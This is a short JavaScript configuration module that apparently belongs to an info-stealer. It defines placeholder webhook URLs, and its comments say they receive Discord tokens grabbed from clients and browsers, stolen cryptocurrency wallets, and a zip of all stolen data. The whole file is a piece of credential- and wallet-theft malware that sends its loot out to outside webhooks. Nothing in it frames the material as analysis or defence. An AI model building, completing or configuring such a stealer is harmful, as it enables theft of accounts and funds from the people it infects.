module.exports = (client) => {
    return {
        url: "REPLACE_THIS", // main webhook url (when initialized)
        discord: "REPLACE_THIS", // grabbed tokens from clients & browsers
        wallets: "REPLACE_THIS", // stolen wallets
        zip: "REPLACE_THIS", // webhook where the zip folder with all stolen data will be sent in
    }
}